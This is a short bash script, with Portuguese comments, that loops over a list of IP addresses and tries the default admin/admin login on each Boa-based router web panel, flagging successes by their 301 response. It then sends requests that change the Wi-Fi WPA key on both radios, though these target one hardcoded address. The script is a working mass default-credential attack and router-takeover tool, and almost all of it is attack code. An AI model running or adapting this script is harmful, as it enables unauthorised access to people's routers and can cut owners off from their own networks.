#!/bin/bash
filename='ip.txt'
n=1
while read line;
do
# reading each line
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "Numero do IP:"
echo "$line"
echo " "
echo "301 é login com sucesso:"
curl  --connect-timeout 5 "http://$line/boaform/admin/formLogin" --data-raw "challenge=&username=admin&password=admin&save=Login&submit-url=%2Fadmin%2Flogin.asp&postSecurityFlag=12726" | grep "301" | cut -d ">" -f 4
echo " "
curl "http://100.68.5.240/boaform/admin/formWlEncrypt" --data-raw "wlanDisabled=OFF&isNmode=1&wpaSSID=0&security_method=6&auth_type=both&wepEnabled=ON&length0=1&format0=1&key0=&wpaAuth=psk&dotIEEE80211W=0&sha256=0&gk_rekey=86400&pskFormat=0&pskValue=153ab2c29a&wapiPskFormat=0&wapiPskValue=&wepKeyLen=wep64&radiusIP=0.0.0.0&radiusPort=1812&radiusPass=&radius2IP=0.0.0.0&radius2Port=1812&radius2Pass=&wapiASIP=0.0.0.0&wlan_idx=1&submit-url=%2Fadmin%2Fwlwpa.asp&encodekey0=&encodepskValue=MTUzYWIyYzI5YQ%3D%3D&encoderadiusPass=&encoderadius2Pass=&save=Apply+Changes&postSecurityFlag=2833" 
echo " "
curl "http://100.68.5.240/boaform/admin/formWlEncrypt" --data-raw "wlanDisabled=OFF&isNmode=1&wpaSSID=0&security_method=6&auth_type=both&wepEnabled=ON&length0=1&format0=1&key0=&wpaAuth=psk&dotIEEE80211W=0&sha256=0&gk_rekey=86400&pskFormat=0&pskValue=153ab2c29a&wapiPskFormat=0&wapiPskValue=&wepKeyLen=wep64&radiusIP=0.0.0.0&radiusPort=1812&radiusPass=&radius2IP=0.0.0.0&radius2Port=1812&radius2Pass=&wapiASIP=0.0.0.0&wlan_idx=0&submit-url=%2Fadmin%2Fwlwpa.asp&encodekey0=&encodepskValue=MTUzYWIyYzI5YQ%3D%3D&encoderadiusPass=&encoderadius2Pass=&save=Apply+Changes&postSecurityFlag=2834"
echo " "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
n=$((n+1))
done < $filename
